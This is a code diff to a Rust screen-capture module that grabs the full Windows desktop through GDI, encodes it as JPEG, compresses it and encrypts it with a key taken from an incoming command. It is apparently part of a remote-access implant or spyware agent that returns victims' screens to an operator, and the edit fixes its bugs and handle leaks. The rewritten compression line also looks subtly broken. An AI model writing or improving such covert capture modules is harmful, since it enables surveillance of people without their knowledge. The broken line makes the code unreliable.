@@ -25,23 +25,28 @@ impl ScreenshotModule {
     fn capture_screenshot(&self) -> Result<Vec<u8>, ModuleError> {
         use windows::Win32::Foundation;
         use windows::Win32::Graphics::Gdi;
-        use windows::Win32::Foundation::GetLastError;
+
+        const SM_CXSCREEN: i32 = 0;
+        const SM_CYSCREEN: i32 = 1;
+        const BI_RGB: u32 = 0;
+        const DIB_RGB_COLORS: u32 = 0;
 
         // Create desktop device context
-        let hdc = unsafe {
-            Gdi::GetDC(Foundation::HWND::default())
-        }.map_err(|_| ModuleError::Execution("Failed to get DC".to_string()))?;
+        let hdc = unsafe { Gdi::GetDC(Foundation::HWND::default()) };
 
-        let screen_width = unsafe { Gdi::GetSystemMetrics(Gdi::SM_CXSCREEN) };
-        let screen_height = unsafe { Gdi::GetSystemMetrics(Gdi::SM_CYSCREEN) };
+        let screen_width = unsafe { Gdi::GetSystemMetrics(SM_CXSCREEN) };
+        let screen_height = unsafe { Gdi::GetSystemMetrics(SM_CYSCREEN) };
 
         if screen_width <= 0 || screen_height <= 0 {
             return Err(ModuleError::Execution("Invalid screen dimensions".to_string()));
         }
 
         // Create compatible DC and bitmap
-        let mem_dc = unsafe { Gdi::CreateCompatibleDC(hdc) }
-            .map_err(|_| ModuleError::Execution("Failed to create compatible DC".to_string()))?;
+        let mem_dc = unsafe { Gdi::CreateCompatibleDC(hdc) };
+        if mem_dc.0.is_null() {
+            unsafe { Gdi::ReleaseDC(Foundation::HWND::default(), hdc) };
+            return Err(ModuleError::Execution("Failed to create compatible DC".to_string()));
+        }
 
         let bitmap = unsafe {
             Gdi::CreateCompatibleBitmap(
@@ -49,7 +54,12 @@ impl ScreenshotModule {
                 screen_width,
                 screen_height,
             )
-        }.map_err(|_| ModuleError::Execution("Failed to create bitmap".to_string()))?;
+        };
+        if bitmap.0.is_null() {
+            unsafe { Gdi::DeleteDC(mem_dc) };
+            unsafe { Gdi::ReleaseDC(Foundation::HWND::default(), hdc) };
+            return Err(ModuleError::Execution("Failed to create bitmap".to_string()));
+        }
 
         // Select bitmap into DC
         let old_bitmap = unsafe { Gdi::SelectObject(mem_dc, bitmap) };
@@ -71,6 +81,7 @@ impl ScreenshotModule {
 
         if !success.as_bool() {
             unsafe { Gdi::DeleteObject(bitmap) };
+            unsafe { Gdi::DeleteDC(mem_dc) };
             unsafe { Gdi::ReleaseDC(Foundation::HWND::default(), hdc) };
             return Err(ModuleError::Execution("BitBlt failed".to_string()));
         }
@@ -149,8 +160,9 @@ impl ScreenshotModule {
                 .ok_or_else(|| ModuleError::Execution("Failed to create image buffer".to_string()))?,
             );
             let mut jpeg_bytes = Vec::new();
+            let mut cursor = std::io::Cursor::new(&mut jpeg_bytes);
             dyn_image
-                .write_to(&mut jpeg_bytes as &mut Vec<u8>, ImageFormat::Jpeg)
+                .write_to(&mut cursor, ImageFormat::Jpeg)
                 .map_err(|_| ModuleError::Execution("JPEG encode failed".to_string()))?;
             Ok(jpeg_bytes)
         } else {
@@ -166,8 +178,9 @@ impl ScreenshotModule {
         width: i32,
         height: i32,
     ) -> Result<Vec<u8>, ModuleError> {
-        use windows::Win32::Foundation::GUID;
         use windows::Win32::Graphics::Gdi;
+
+        const BI_RGB: u32 = 0;
 
         // Get bitmap bits
         let mut bmi = Gdi::BITMAPINFO {
@@ -177,7 +190,7 @@ impl ScreenshotModule {
                 biHeight: height,
                 biPlanes: 1,
                 biBitCount: 32,
-                biCompression: Gdi::BI_RGB.0,
+                biCompression: BI_RGB,
                 biSizeImage: 0,
                 biXPelsPerMeter: 0,
                 biYPelsPerMeter: 0,
@@ -193,7 +206,7 @@ impl ScreenshotModule {
         };
 
         let mut bits = vec![0u8; (width * height * 4) as usize];
-        let bits_ptr = bits.as_mut_ptr();
+        let bits_ptr = bits.as_mut_ptr() as *mut std::ffi::c_void;
 
         let success = unsafe {
             Gdi::GetDIBits(
@@ -203,7 +216,7 @@ impl ScreenshotModule {
                 height as u32,
                 bits_ptr,
                 &mut bmi as *mut Gdi::BITMAPINFO,
-                Gdi::DIB_RGB_COLORS,
+                DIB_RGB_COLORS,
             )
         };
 
@@ -230,10 +243,9 @@ impl ScreenshotModule {
         ).ok_or_else(|| ModuleError::Execution("Image buffer creation failed".to_string()))?;
 
         let mut jpeg_bytes = Vec::new();
-        img.write_to(
-            &mut jpeg_bytes as &mut Vec<u8>,
-            image::ImageFormat::Jpeg,
-        ).map_err(|_| ModuleError::Execution("JPEG encode failed".to_string()))?;
+        let mut cursor = std::io::Cursor::new(&mut jpeg_bytes);
+        img.write_to(&mut cursor, image::ImageFormat::Jpeg)
+            .map_err(|_| ModuleError::Execution("JPEG encode failed".to_string()))?;
 
         Ok(jpeg_bytes)
     }
@@ -253,7 +265,8 @@ impl crate::modules::Module for ScreenshotModule {
         let screenshot = self.capture_screenshot()?;
 
         // Compress further with deflate
-        let compressed = flate2::compress(&screenshot, 6);
+        let mut encoder = flate2::write::DeflateEncoder::new(Vec::new(), flate2::Compression::default());
+        let compressed = encoder.write_all(&screenshot).map(|_| encoder.finish()).unwrap_or_else(|_| Vec::new());
 
         // Encrypt result
         let encrypted = crypto::encrypt_with_integrity(&compressed, &cmd.crypto_key);
